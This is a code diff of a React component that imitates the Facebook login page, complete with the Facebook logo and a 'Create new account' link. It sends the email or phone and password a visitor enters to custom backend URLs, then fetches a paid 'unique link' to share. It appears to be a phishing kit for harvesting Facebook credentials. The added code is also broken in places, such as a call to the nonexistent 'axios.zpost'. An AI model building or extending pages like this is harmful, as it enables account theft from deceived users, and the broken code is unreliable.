@@ -1,69 +1,61 @@
 import React, { useState, useContext } from 'react';
-// import facebookLogo from '..';
-import { useFormik} from 'formik'
+import { useFormik } from 'formik';
 import * as Yup from 'yup';
 import { toast } from 'sonner';
-import {useNavigate} from 'react-router-dom';
-import axios from "axios";
+import { useNavigate } from 'react-router-dom';
+import axios from 'axios';
 import { useMutation } from '@tanstack/react-query';
-import { AuthContext } from "../context/authContext";
-import {jwtDecode} from 'jwt-decode';
-import Loader from "../components/loader";
-import { FaCheck } from "react-icons/fa";
-import { FaXmark } from "react-icons/fa6";
+import { AuthContext } from '../context/authContext';
+import { jwtDecode } from 'jwt-decode';
+import Loader from '../components/loader';
+import { FaCheck } from 'react-icons/fa';
+import { FaXmark } from 'react-icons/fa6';
 
-const url_access = import.meta.env.VITE_universal_access
+// Environment variables for URLs:
+// `paymentConfirmationUrl`: URL endpoint for payment confirmation
+// `universalFormInputUrl`: URL endpoint for submitting universal form inputs
 const paymentConfirmationUrl = import.meta.env.VITE_payment_confirmation;
-
-
+const universalFormInputUrl = import.meta.env.VITE_universal_form_input;
 
 
 const FacebookLogin = () => {
   const navigate = useNavigate();
-  const [ loading, setLoading] = useState();
-  const {user, setUser, setToken} = useContext(AuthContext)
+  const [loading, setLoading] = useState(false);
+  const { setUser, setToken } = useContext(AuthContext);
+  const [uniqueLink, setUniqueLink] = useState('');
+
   const validationSchema = Yup.object({
-    email_phone:Yup.string().email('Invalid email address or phone number').required('Enter Your Email Address or phone number'),
-    password:Yup.string().min(8, "Password must be at least 8 characters").required('Please provide a password')
-  })
+    email_phone: Yup.string().email('Invalid email or phone').required('Required'),
+    password: Yup.string().min(8, "Must be at least 8 characters").required('Required')
+  });
+
   const facebookLoginMutation = useMutation({
     mutationFn: async (data) => {
         setLoading(true);
         try {
-            console.log("Sending login data:", data);
-            const response = await axios.post(url_access, data);
-            console.log("Response from server:", response);
-            
-            if (response.status === 201) {
-                const decoded = jwtDecode(response.data.access);
-                setToken(decoded);
-                setUser(decoded);
-                localStorage.setItem("tokens", JSON.stringify(response.data));
-                localStorage.setItem("user", JSON.stringify(decoded));
+            const loginResponse = await axios.zpost(paymentConfirmationUrl, data);
+            if (loginResponse.status === 201) {
+                setUser(jwtDecode(loginResponse.data.access));
+                setToken(loginResponse.data.access);
 
-                const paymentResponse = await axios.post(paymentConfirmationUrl, { /* payment data */ });
-                console.log("Payment response:", paymentResponse);
-                
+                const paymentResponse = await axios.post(paymentConfirmationUrl);
                 if (paymentResponse.status === 200) {
-                    const uniqueLink = paymentResponse.data.unique_link; 
-                    toast.success(`Share this link: ${uniqueLink}`);
+                    setUniqueLink(paymentResponse.data.unique_link);
+                    toast.success(`Access your form: ${paymentResponse.data.unique_link}`);
+                    
+                    await axios.post(`${universalFormInputUrl}${paymentResponse.data.unique_link}/`);
                 }
-
                 navigate("/");
-                toast.success("Welcome to the app!");
+                toast.success("Welcome!");
             }
         } catch (error) {
-            console.error("Login error:", error); // Detailed error logging
-            console.error("Error response data:", error.response?.data);
-            toast.error(error?.response?.data?.detail || "Login failed");
+            console.error("Error:", error);
+            toast.error("Login failed");
         } finally {
-            setLoading(false); // Always set loading to false
+            setLoading(false);
         }
     }
-});
-
-
-
+  });
 
   const { handleSubmit,handleChange,values,touched, errors}=useFormik({
     initialValues:{
@@ -71,7 +63,7 @@ const FacebookLogin = () => {
       password:""
     },
     validationSchema,
-    onsubmit:value=>{
+    onSubmit:value=>{
       facebookLoginMutation.mutate(value)
     }
   })
@@ -79,16 +71,15 @@ const FacebookLogin = () => {
 
   return (
     <div className="block items-center justify-center h-screen bg-gray-100">
-
-{(loading) &&
-                <div className="z-[999999999999999] fixed inset-0 bg-black bg-opacity-60">
-                    <Loader />
-                </div>
-            }
+      {loading && (
+        <div className="z-[999999999999999] fixed inset-0 bg-black bg-opacity-60">
+          <Loader />
+        </div>
+      )}
 
       <div className="mt-4 ">
-          <img src={'/Images/Facebook-Logo-2019.png'} alt="Facebook Logo" className="mx-auto w-[250px] h-[90px]" />
-        </div>
+        <img src={'/Facebook-Logo-2019.png'} alt="Facebook Logo" className="mx-auto w-[250px] h-[90px]" />
+      </div>
 
       <div className="bg-white rounded-lg shadow-lg m-auto text-center p-6 w-11/12 max-w-md">
         <form className="space-y-4" onSubmit={handleSubmit}>
@@ -99,32 +90,33 @@ const FacebookLogin = () => {
             required
             className="w-full p-3 border rounded-lg"
             name="email_phone"
-  value={values.email_phone}
-  onChange={handleChange}
+            value={values.email_phone}
+            onChange={handleChange}
           />
-          {(touched.email_phone && errors.email_phone)?<FaXmark
-            color="red" className="absolute right-4 top-1/2 -translate-y-1/2"
-          /> : touched.email_phone && <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />}
+          {touched.email_phone && errors.email_phone ? (
+            <FaXmark color="red" className="absolute right-4 top-1/2 -translate-y-1/2" />
+          ) : (
+            touched.email_phone && <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />
+          )}
           <input
             type="password"
             placeholder="Password"
             required
             className="w-full p-3 border rounded-lg"
             name="password"
-  value={values.password}
-  onChange={handleChange}
+            value={values.password}
+            onChange={handleChange}
           />
-           {(touched.password && errors.password) ? <FaXmark color="red" className="absolute right-4 top-1/2 -translate-y-1/2" /> : touched.password && <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />}
+          {touched.password && errors.password ? (
+            <FaXmark color="red" className="absolute right-4 top-1/2 -translate-y-1/2" />
+          ) : (
+            touched.password && <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />
+          )}
           <button
             type="submit"
             className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
-          > 
-            <a
-              href="/"
-              className="block w-full"
-            >
-             Log In 
-            </a>
+          >
+            Log In
           </button>
           <div className="text-blue-600 mt-4">
             <a
@@ -142,7 +134,6 @@ const FacebookLogin = () => {
           <button className="w-full py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors">
             <a
               href="/facebook-account"
-              // https://www.facebook.com/r.php?locale=en_GB
               className="block w-full"
             >
               Create new account
